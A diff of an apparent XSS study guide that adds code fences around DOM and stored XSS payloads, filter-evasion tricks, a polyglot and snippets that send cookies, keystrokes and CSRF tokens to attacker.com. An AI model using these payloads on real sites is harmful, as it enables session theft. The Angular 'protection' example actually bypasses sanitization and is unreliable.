@@ -98,7 +98,9 @@ The following jQuery functions are also **sinks** that can introduce DOM-XSS vul
 #### jQuery XSS
 
 // Classic hashchange exploit
+```html
 <iframe src="https://vulnerable.com#" onload="this.src+='<img src=x onerror=alert(1)>'">
+```
 
 ### 1.4 Exploiting DOM XSS with Different Sources and Sinks
 
@@ -117,21 +119,32 @@ In principle, a website is vulnerable to DOM-based cross-site scripting if there
 ##### jQuery Vulnerabilities
 
 // Attribute manipulation
+```html
 "$('#backLink').attr("href", location.search);"
-// Exploit: "?returnUrl=javascript:alert(document.domain)"
+```
+// Exploit: 
+```html
+"?returnUrl=javascript:alert(document.domain)"
+```
 
 // Selector injection
-"$(window).on('hashchange', function() {"
-"    $(location.hash).scrollIntoView();"
-"});"
+```html
+$(window).on('hashchange', function() {
+    $(location.hash).scrollIntoView();
+});
+```
+
 // Exploit via iframe:
-"<iframe src="https://vulnerable.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">"
+```html
+<iframe src="https://vulnerable.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```
 
 ##### AngularJS Vulnerabilities
-
+```html
 <div ng-app>
   {{constructor.constructor('alert(1)')()}}
 </div>
+```
 // Lab: DOM XSS in AngularJS expression (Not solved)
 
 #### Hybrid DOM XSS Patterns
@@ -183,16 +196,22 @@ In principle, a website is vulnerable to DOM-based cross-site scripting if there
 ### 2.2 Advanced Filter Evasion
 
 // Chrome XSS Auditor Bypass
+```html
 <script>
 location.href = 'javascript:alert%281%29';
 </script>
+```
 
 // UTF-7 Bypass (IE)
+```html
 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+```
 
 // JavaScript Obfuscation
+```html
 eval('al'+'ert(1)');
 window\['al'+'ert'\](1);
+```
 
 ## 3\. Stored XSS Professional
 
@@ -206,34 +225,46 @@ window\['al'+'ert'\](1);
 ### 3.2 Advanced Persistence Techniques
 
 // SVG XSS
+```html
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+```
 
 // PDF Embedded JS
+```html
 /Names <</JavaScript <</Names \[(alert(1))\]>>>>
+```
 
 // HTML5 Storage
+```html
 <script>
 localStorage.setItem('xss', '<img src=x onerror=alert(1)>');
 location.reload();
 </script>
+```
 
 ### 3.3 Impact Escalation
 
 // Session Hijacking
+```html
 document.location='https://attacker.com/?cookie='+document.cookie;
+```
 
 // Keylogger
+```html
 document.onkeypress = function(e) {
     new Image().src='https://attacker.com/?k='+e.key;
 };
+```
 
 // CSRF Token Theft
+```html
 fetch('/account')
     .then(r => r.text())
     .then(t => {
         let token = t.match(/csrfToken = '(.\*?)'/)\[1\];
         new Image().src='https://attacker.com/?token='+token;
     });
+```
 
 ## 4\. XSS Prevention Checklist
 
@@ -249,14 +280,20 @@ fetch('/account')
 ### 4.2 Framework Protections
 
 // React (JSX auto-escapes)
+```html
 <div>{userInput}</div>
+```
 
 // Angular (sanitization)
+```html
 import { DomSanitizer } from '@angular/platform-browser';
 this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
+```
 
 // Vue (v-html directive)
+```html
 <div v-html="sanitizedContent"></div>
+```
 
 ## 5\. Professional Testing Tools
 
@@ -269,7 +306,9 @@ this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
 ### 5.2 Manual Testing Utilities
 
 // XSS Polyglot
+```html
 javascript:/\*--></title></style></textarea></script><xmp><svg/onload='+/"/+/onmouseover=1/+/\[\*/\[\]/+alert(1)//'>
+```
 
 // Cheatsheets
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
